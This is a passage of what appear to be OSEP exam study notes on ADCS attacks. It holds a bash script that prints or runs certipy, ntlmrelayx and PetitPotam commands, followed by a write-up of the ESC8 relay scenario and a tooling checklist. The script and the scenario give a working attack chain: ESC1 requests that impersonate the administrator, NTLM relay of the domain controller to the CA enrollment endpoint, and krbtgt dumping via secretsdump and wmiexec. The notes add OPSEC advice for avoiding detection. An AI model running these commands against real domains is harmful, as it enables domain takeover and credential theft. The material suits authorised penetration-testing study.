#           the CA name/template name before acting.
# Differences from docs/12-ad-attacks.md:
#   1) The doc's scenario 55 lists only the ntlmrelayx and petitpotam commands;
#      this script's relay mode adds the "verify whether EPA is enabled"
#      pre-check (curl probe of the certsrv response code), because EPA is the
#      number one failure cause in scenario 55; only when EPA is off does it
#      start the relay.
#   2) The doc's scenario 54 folds pfx -> ccache into the auth step; this script
#      splits out a pfx2ccache mode that spells out both steps: the openssl PEM
#      split and the certipy auth run that produces the ccache.
#   3) In the doc `-upn administrator@corp.local` is passed via -U, with the
#      default administrator@<DOMAIN>.
# =============================================================================
set -u

MODE="deps"
DOMAIN=""      # -d
DC=""          # -s  DC (TARGET)
CAHOST=""      # -c  CA host (TARGET)
CANAME=""      # -n  CA name, e.g. CORP-CA
TEMPLATE=""    # -t  certificate template name
USER=""        # -u
PASS=""        # -p
NTHASH=""      # -H
UPN=""         # -U  UPN of the object ESC1 will impersonate
PFX=""         # -P  pfx file
OUT="admin"    # -o  output prefix
LHOST=""       # -l  attacker IP (relay listener / coercion target)
VICTIM=""      # -V  victim coerced into authenticating (usually a DC FQDN)
LOOT="$HOME/osep/loot/certs"
EXEC=0         # -x

usage() {
    sed -n '2,30p' "$0" | sed 's/^# \{0,1\}//'
    cat <<'EOF'

Parameters:
  -m <mode>   mode (default deps):
       deps        dependency self-check (certipy / ntlmrelayx / petitpotam / openssl)
       find        enumerate templates: certipy find -vulnerable -stdout (scenario 54, step 1)
       req         ESC1 request: certipy req -template ... -upn ... (scenario 54, step 2)
       auth        trade a PFX for the NTLM hash: certipy auth -pfx (shared by scenarios 54/55)
       pfx2ccache  full PFX -> PEM -> ccache flow (take the ticket to -k tools)
       relay       ESC8: probe EPA + start ntlmrelayx --adcs + print the trigger command (scenario 55)
       all         deps + find + req + auth command medley (needs -x to run in order)
  -d <fqdn>    domain FQDN (DOMAIN); needed by find/req/auth/relay
  -s <host>    DC host (TARGET), the -dc-ip target for most modes
  -c <host>    CA host FQDN (TARGET); needed by req/relay
  -n <name>    CA name (the CA Name in certipy find output); needed by req
  -t <tpl>     certificate template name; req=vulnerable template (e.g. VulnTemplate), relay=Machine
  -u <user>    domain user (USER)
  -p <pass>    cleartext password (PASS)
  -H <hash>    NTHASH (in the certipy -hashes form)
  -U <upn>     UPN of the object ESC1 will impersonate, default administrator@<DOMAIN>
  -P <file>    PFX file path (needed by auth / pfx2ccache)
  -o <prefix>  output prefix, default admin (produces admin.pfx)
  -l <ip>      LHOST: attacker IP, the address the victim connects back to when the relay is triggered
  -V <host>    victim host coerced into authenticating (defaults to the DC from -s)
  -x           actually execute (print the commands only by default)
  -h           this help

Exit codes: 0 normal / 1 argument or dependency error
EOF
    exit 0
}

err()  { printf '[!] %s\n' "$*" >&2; }
info() { printf '[*] %s\n' "$*"; }
head_() { printf '\n===== %s =====\n' "$*"; }
have() { command -v "$1" >/dev/null 2>&1; }

# Print a command line: only quote arguments containing spaces/quotes, so the output can be copy-pasted as is
printable() {
    local out="" a
    for a in "$@"; do
        case "$a" in
            *" "*|*"'"*|*'"'*) out="$out '$a'" ;;
            *)                 out="$out $a" ;;
        esac
    done
    printf '%s\n' "${out# }"
}

run() {
    printable "$@"
    if [ "$EXEC" != "1" ]; then return 0; fi
    if ! have "$1"; then
        err "missing command: $1 (certipy: pipx install certipy-ad; impacket: sudo apt install -y impacket-scripts)"
        return 0
    fi
    "$@" || err "the previous command returned non-zero: troubleshoot from the output (CA name/template name/permissions/EPA)"
    return 0
}

while getopts "m:d:s:c:n:t:u:p:H:U:P:o:l:V:xh" opt; do
    case "$opt" in
        m) MODE="$OPTARG" ;;
        d) DOMAIN="$OPTARG" ;;
        s) DC="$OPTARG" ;;
        c) CAHOST="$OPTARG" ;;
        n) CANAME="$OPTARG" ;;
        t) TEMPLATE="$OPTARG" ;;
        u) USER="$OPTARG" ;;
        p) PASS="$OPTARG" ;;
        H) NTHASH="$OPTARG" ;;
        U) UPN="$OPTARG" ;;
        P) PFX="$OPTARG" ;;
        o) OUT="$OPTARG" ;;
        l) LHOST="$OPTARG" ;;
        V) VICTIM="$OPTARG" ;;
        x) EXEC=1 ;;
        h) usage ;;
        *) usage ;;
    esac
done

# certipy binary probe: newer Kali calls it certipy-ad, older/manual installs call it certipy
CERTIPY=""
if have certipy; then CERTIPY="certipy"
elif have certipy-ad; then CERTIPY="certipy-ad"
else CERTIPY="certipy"   # for printing only; the deps mode reports this explicitly
fi

# Credentials: array form for actual execution (the shell will not split them again, so passwords with spaces/special characters are safe)
CREDS=()
build_creds() {
    if [ -n "$PASS" ]; then
        CREDS=(-u "$USER@$DOMAIN" -p "$PASS")
    elif [ -n "$NTHASH" ]; then
        CREDS=(-u "$USER@$DOMAIN" -hashes ":$NTHASH")
    else
        CREDS=(-u "$USER@$DOMAIN" -p "PASS")
    fi
}

# Credentials: string form, only for command lines that are "printed for a human"
creds_fragment() {
    if [ -n "$PASS" ]; then
        printf -- "-u '%s@%s' -p '%s'" "$USER" "$DOMAIN" "$PASS"
    elif [ -n "$NTHASH" ]; then
        printf -- "-u '%s@%s' -hashes ':%s'" "$USER" "$DOMAIN" "$NTHASH"
    else
        printf -- "-u '%s@%s' -p 'PASS'" "$USER" "$DOMAIN"
    fi
}

require() {
    local missing=""
    while [ "$#" -gt 0 ]; do
        case "$1" in
            DOMAIN)  [ -z "$DOMAIN" ]  && missing="$missing -d" ;;
            DC)      [ -z "$DC" ]      && missing="$missing -s" ;;
            CAHOST)  [ -z "$CAHOST" ]  && missing="$missing -c" ;;
            CANAME)  [ -z "$CANAME" ]  && missing="$missing -n" ;;
            TEMPLATE)[ -z "$TEMPLATE" ] && missing="$missing -t" ;;
            USER)    [ -z "$USER" ]    && missing="$missing -u" ;;
            PFX)     [ -z "$PFX" ]     && missing="$missing -P" ;;
            LHOST)   [ -z "$LHOST" ]   && missing="$missing -l" ;;
        esac
        shift
    done
    if [ -n "$missing" ]; then
        err "mode -m $MODE is missing required arguments:$missing"
        err "(use -h to see which arguments each mode needs)"
        exit 1
    fi
}

# ---------------------------------------------------------------------------
mode_deps() {
    head_ "dependency self-check (deps)"
    local ok=1
    if [ "$CERTIPY" = "certipy" ] && ! have certipy; then
        err "certipy is not installed: pipx install certipy-ad (on Kali 2023+ the command name is certipy-ad)"
        ok=0
    else
        info "certipy     : $CERTIPY ($(command -v "$CERTIPY"))"
    fi
    for t in impacket-ntlmrelayx impacket-petitpotam impacket-secretsdump openssl curl; do
        if have "$t"; then info "$t : installed"; else
            case "$t" in
                openssl|curl) err "$t is missing: sudo apt install -y $t" ;;
                *)            err "$t is missing: sudo apt install -y impacket-scripts (or python3 -m pip install impacket)" ;;
            esac
            ok=0
        fi
    done
    echo
    info "certificate and ticket output directory: ${LOOT} (created automatically if absent)"
    mkdir -p "$LOOT" 2>/dev/null || err "failed to create $LOOT (does not affect print mode)"
    if [ "$ok" = "1" ]; then info "dependencies complete."; else info "some are missing; install them with the commands above before continuing."; fi
}

# ---------------------------------------------------------------------------
mode_find() {
    require DOMAIN DC USER
    head_ "template enumeration (find, scenario 54 step 1) -- full list first, then look at -vulnerable"
    build_creds
    info "full enumeration (keep the JSON/text output so you can look up CA Name and the template list later):"
    run $CERTIPY find "${CREDS[@]}" -dc-ip "$DC" -stdout
    echo
    info "exploitable entries only (more common in an exam):"
    run $CERTIPY find "${CREDS[@]}" -dc-ip "$DC" -vulnerable -stdout
    echo
    info "write to files (easy to grep):"
    echo "$CERTIPY find $(creds_fragment) -dc-ip $DC -vulnerable -stdout > $LOOT/find-vuln.txt"
    echo "$CERTIPY find $(creds_fragment) -dc-ip $DC -stdout > $LOOT/find-all.txt"
    echo
    info "the four ESC1 conditions (all must hold at once):"
    info "  ① the template enables enrollee-supplied SAN (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT, you can fill in -upn)"
    info "  ② the EKU includes Client Authentication (or Any Purpose)"
    info "  ③ the current user/its group has Enroll permission on the template"
    info "  ④ CA Manager Approval is not enabled (otherwise the request is left pending)"
    info "if they do not hold, do not force it: go to ESC8 (scenario 55) or back to the delegation/LAPS routes."
}

# ---------------------------------------------------------------------------
mode_req() {
    require DOMAIN DC CAHOST CANAME TEMPLATE USER
    [ -z "$UPN" ] && UPN="administrator@$DOMAIN"
    head_ "ESC1 request (req, scenario 54 step 2)"
    build_creds
    info "impersonation target UPN: ${UPN} (must be a user that really exists, the DC validates it)"
    run $CERTIPY req "${CREDS[@]}" -ca "$CANAME" -target "$CAHOST" \
        -template "$TEMPLATE" -upn "$UPN" -dc-ip "$DC" -out "$OUT"
    echo
    info "output: $OUT.pfx (usable directly when certipy leaves it unprotected)"
    info "next: ./m12-adcs-esc1-esc8.sh -m auth -P $OUT.pfx -d $DOMAIN -s $DC"
    echo
    info "failure branches:"
    info "  - 0x80094012 (certificate policy does not match) -> the template EKU lacks client authentication, try the next -t candidate"
    info "  - permission denied -> the current user has no Enroll right on that template; the -U UPN does not exist or does not match"
    info "  - CA name/host resolution fails -> take CA Name and the DNS host name from the find output and"
    info "    point -n / -c at them; if needed put the CA FQDN and its real IP in /etc/hosts"
}

# ---------------------------------------------------------------------------
mode_auth() {
    require PFX DOMAIN DC
    head_ "certificate authentication (auth) -- trade the PFX for the NTLM hash"
    run $CERTIPY auth -pfx "$PFX" -dc-ip "$DC" -domain "$DOMAIN"
    echo
    info "once you have the NTHASH:"
    echo "impacket-secretsdump -just-dc-user krbtgt -hashes :NTHASH $DOMAIN/Administrator@$DC"
    echo "impacket-wmiexec $DOMAIN/Administrator@$DC -hashes :NTHASH"
    echo
    info "specify the username explicitly (when the UPN and sAMAccountName differ):"
    echo "$CERTIPY auth -pfx $PFX -username administrator -domain $DOMAIN -dc-ip $DC"
    echo
    info "failure branch: the request succeeded but auth fails -> re-run req and overwrite the certificate with -o, or pass -username explicitly."
}

# ---------------------------------------------------------------------------
mode_pfx2ccache() {
    require PFX DOMAIN DC
    head_ "PFX -> PEM -> ccache flow (pfx2ccache)"
    info "① split the PFX into PEM (some tools/manual checks need it; certipy defaults to an empty password)"
    echo "openssl pkcs12 -in $PFX -out ${PFX%.*}.pem -nodes -passin pass:"
    echo "openssl x509 -in ${PFX%.*}.pem -noout -text | head -40     # check issuer and SAN"
    echo
    info "② certipy auth produces both the hash and a ccache (ccache filename = the username in the certificate)"
    run $CERTIPY auth -pfx "$PFX" -dc-ip "$DC" -domain "$DOMAIN"
    echo
    info "③ use the ccache against -k tools (joins up with m12-kerberos-tickets-linux.sh)"
    echo "export KRB5CCNAME=administrator.ccache"
    echo "klist -e"
    echo "impacket-secretsdump -k -no-pass $DC"
    echo "impacket-wmiexec -k -no-pass $DOMAIN/Administrator@$DC"
    echo
    info "confirm the SAN holds the object you want to impersonate: openssl x509 -in ${PFX%.*}.pem -noout -text | grep -A1 'Subject Alternative Name'"
}

# ---------------------------------------------------------------------------
mode_relay() {
    require CAHOST
    [ -z "$VICTIM" ] && VICTIM="$DC"
    [ -z "$TEMPLATE" ] && TEMPLATE="Machine"
    [ -z "$LHOST" ] && LHOST="LHOST"      # print as a placeholder when -l is not given
    [ -z "$VICTIM" ] && VICTIM="TARGET"   # print as a placeholder when -V/-s is not given
    [ -z "$DOMAIN" ] && DOMAIN="DOMAIN"
    head_ "ESC8 relay (relay, scenario 55)"
    local url="http://$CAHOST/certsrv/certfnsh.asp"
    info "relay target URL: $url"

    echo "# ① Pre-check: confirm Web Enrollment exists and EPA is not enabled (the number one failure cause)"
    echo "curl -s -o /dev/null -w '%{http_code}\\n' http://$CAHOST/certsrv/"
    echo "curl -s -o /dev/null -w '%{http_code}\\n' https://$CAHOST/certsrv/ -k"
    info "expected: the HTTP endpoint returns 200 or 401; if HTTPS always returns 401 and HTTP misbehaves too -> EPA is probably on,"
    info "      under EPA the CA refuses NTLM relay, there is no legitimate bypass, drop ESC8 and pick another entry point."
    echo

    echo "# ② Start the relay (forward the authentication you receive to the ADCS HTTP enrollment endpoint)"
    run impacket-ntlmrelayx -t "$url" --adcs --template "$TEMPLATE" -smb2support -l "$LOOT"
    echo

    echo "# ③ In another terminal, coerce the victim (the DC machine account by default) into authenticating to LHOST"
    if [ -n "$USER" ]; then
        run impacket-petitpotam -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" "$LHOST" "$VICTIM"
    else
        echo "impacket-petitpotam -u USER@$DOMAIN -p 'PASS' -dc-ip $DC LHOST $VICTIM"
    fi
    echo "# alternative trigger vectors (when petitpotam is patched/blocked by a firewall):"
    echo "python3 /opt/PetitPotam/PetitPotam.py -u USER -p PASS -d $DOMAIN LHOST $VICTIM"
    echo "python3 /opt/dementor/dementor.py -u USER -p PASS -d $DOMAIN LHOST $VICTIM"
    echo

    info "④ once the relay log shows 'Got NTLMv2 hash' + 'Server returned certificate':"
    info "   the certificate lands in ${LOOT} (base64 PFX, named like <user>.pfx)"
    info "   ./m12-adcs-esc1-esc8.sh -m auth -P <cert>.pfx -d $DOMAIN -s $DC"
    echo
    info "failure branches:"
    info "  - nothing comes back after the trigger / 401 -> suspect EPA; once confirmed drop ESC8, do not retry in a loop"
    info "  - the trigger works but the certificate is refused -> the template does not allow that victim to enroll, change --template"
    info "    (run certipy find first to see which templates allow the Domain Computers group)"
    info "  - no usable trigger vector -> ESC8 does not hold, move to another module's entry point"
    info "OPSEC: the relay log contains credential hashes, run it from ~/osep/logs and clean up afterwards;"
    info "      prefer the DC machine account as the victim (behaviorally it looks like normal machine auto-enrollment)."
}

# ---------------------------------------------------------------------------
case "$MODE" in
    deps)       mode_deps ;;
    find)       mode_find ;;
    req)        mode_req ;;
    auth)       mode_auth ;;
    pfx2ccache) mode_pfx2ccache ;;
    relay)      mode_relay ;;
    all)        mode_deps; mode_find; mode_req; mode_auth ;;
    *)          err "unknown mode: $MODE"; usage ;;
esac

printf '\n[*] mode %s finished. Commands are printed only by default, add -x to actually run them.\n' "$MODE"
info "output directory: ${LOOT} (export certificates/PFX to the attacker in good time and clean up leftovers on the target)"
````

## Scenario 55: No usable ESC1 template, but the CA exposes a relayable HTTP enrollment endpoint (ESC8)

**Situation**: The target offers ADCS Web Enrollment (`http(s)://CA/certsrv/`); you relay a victim's NTLM authentication to the enrollment endpoint and trade it for a certificate. The classic victim: **the DC machine account** (once the relay succeeds you get a certificate for the DC identity -> exchange it for the hash -> DCSync).

**Assumptions**: You already have a domain credential you can use to trigger authentication (an ordinary domain user is enough, for PetitPotam/PrinterBug); the attacker can be actively connected to by the victim (usually the DC machine account); the CA offers Web Enrollment with EPA not enabled; the relay target template allows machine accounts to enroll. If any of the three does not hold, this scenario is a dead end — verify each one before you act.

**ESC8 relay conditions**: ① the CA has HTTP(S) Web Enrollment enabled (`/certsrv/certfnsh.asp`) and **EPA is not enabled** — with EPA on, the CA refuses the NTLM relay (HTTP 401), and that is the number one failure cause in this scenario; ② the template you relay to allows the victim (the DC machine account) to enroll and has an EKU usable for authentication; ③ the attacker can coerce the victim into authenticating (SpoolSample/PetitPotam/DFSCoerce) to the host running the **relay listener**.

**Prepare (attacker side)**: `impacket-ntlmrelayx` (with `--adcs` for integrated certificate requests), an authentication trigger script (`impacket-petitpotam`/`printerbug`/`dementer`), `certipy` (to use the PFX you get); configure the CA FQDN in `/etc/hosts` first.

**Procedure**:
```bash
# ① Start the relay: forward SMB authentication to the ADCS HTTP enrollment endpoint
impacket-ntlmrelayx -t http://CA01.corp.local/certsrv/certfnsh.asp \
  --adcs --template 'Machine' -smb2support -l /tmp/relay-loot
# ② Coerce the DC into authenticating to the attacker (another terminal)
impacket-petitpotam -u USER@corp.local -p 'PASS' -dc-ip DC01.corp.local \
  LHOST DC01.corp.local
# ③ A base64 pfx appears in the relay log -> write it to disk -> exchange it with certipy
certipy auth -pfx DC01.pfx -dc-ip DC01.corp.local -domain corp.local
impacket-secretsdump -just-dc-user krbtgt -hashes :NTHASH CORP/Administrator@DC01.corp.local
```
**Scripts used**: `m12-adcs-esc1-esc8.sh` (relay mode: start the relay + trigger + PFX handling + dependency check).

**Validation**: the ntlmrelayx log shows `Got NTLMv2 hash` + `Server returned certificate`; `certipy auth` prints the NTLM hash of the victim machine account; DCSync with the DC hash succeeds.

**Failure branches and alternatives**:
- After the trigger the relay shows nothing / 401 -> EPA is probably enabled: if the HTTPS endpoint fails too, confirm EPA and **drop ESC8** (there is no legitimate bypass under EPA), go back to ESC1/another entry point; do not retry in a loop and waste time.
- The trigger works but the certificate request is refused -> the template does not allow that victim to enroll, or it has no authentication EKU; change the template in `ntlmrelayx --adcs --template` (run `certipy find` first to see which templates allow Domain Computers).
- No usable trigger vector (all RPC paths patched or firewalled) -> ESC8 has no source of victim authentication and is not viable; move to another module's entry point.
- The relay yields a certificate for a low-value account -> change the trigger target (triggering a domain admin logon session is hard to control, the DC machine account is the most reliable).

**Exam / OPSEC notes**: `ntlmrelayx` receives and forwards authentication and its log holds credential hashes, so run it from `~/osep/logs` and clean up afterwards; the CA's HTTP log records every relayed request — prefer the DC machine account as the victim (behaviorally it looks like a normal machine auto-enrolling), and avoid forging a domain admin request that leaves an obvious anomaly.

---

## Appendix: the minimal shared preparation checklist for this module (attacker side)

```bash
# install everything in one go (Kali)
sudo apt install -y impacket-scripts ldap-utils krb5-user   # put DOMAIN in the Realm prompt
pipx install certipy-ad
# DNS convenience: put the DC/CA/target FQDNs in /etc/hosts (Kerberos does not allow IPs)
# ticket directory
mkdir -p ~/osep/tickets ~/osep/loot/certs
```
Windows-side tools (copy to the target host, from a fixed source): `Rubeus.exe`, `SpoolSample.exe` (or the single-file printerbug), `SharpHound.exe` (enumeration aid, not required). **If impacket is not installed, just `python3 -m pip install impacket` and call the modules**, and take the command names from the Kali packaging (`impacket-wmiexec` and friends).
